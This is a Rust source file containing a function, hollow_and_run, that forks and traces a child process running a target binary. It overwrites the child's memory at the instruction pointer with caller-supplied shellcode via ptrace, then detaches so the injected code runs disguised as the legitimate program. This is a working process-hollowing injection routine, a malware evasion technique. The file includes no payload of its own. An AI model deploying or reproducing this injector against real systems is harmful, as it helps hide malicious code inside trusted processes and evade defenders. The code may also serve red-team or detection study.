use nix::sys::ptrace::{detach, getregs, traceme, write};
use nix::sys::wait::waitpid;
use nix::unistd::{execv, fork, ForkResult};
use std::ffi::{c_void, CStr, CString};

pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
    match unsafe { fork() } {
        // This is the original process and has the same PID as it
        Ok(ForkResult::Parent { child, .. }) => {
            // Wait for the child to be ready for ptrace manipulation
            if let Err(error) = waitpid(child, None) {
                panic!("Could not wait for {target_process} to change state: {error}");
            };

            // Dump the registers for the child process
            let registers = match getregs(child) {
                Ok(value) => value,
                Err(error) => panic!("Could not get registers for {target_process}: {error}"),
            };

            // Copy RIP to a mutable variable
            let mut point = registers.rip;

            // Write the shellcode over where RIP used to point, one byte at a time
            for byte in shellcode {
                if let Err(error) =
                    unsafe { write(child, point as *mut c_void, *byte as *mut c_void) }
                {
                    panic!("Unable to write portion of shellcode at {byte} to {target_process}: {error}");
                }
                point += 1;
            }

            // Detach from the process so it can resume execution
            if let Err(error) = detach(child, None) {
                panic!("Unable to detach from {target_process}: {error}");
            }
        }
        // This is the forked child and has a different PID
        Ok(ForkResult::Child) => {
            // Indicate to the parent process that the child is traceable
            if let Err(error) = traceme() {
                panic!("Could not set child as traceable: {error}");
            }

            // Execute the target process in place of the currently running one (ie, the child)
            let executable = CString::new(target_process).unwrap();
            let arguments: &[&CStr; 0] = &[];
            if let Err(error) = execv(&executable, arguments) {
                panic!("Could not execv: {error}");
            }
        }
        Err(err) => panic!("Forking the parent failed: {err}"),
    }
}
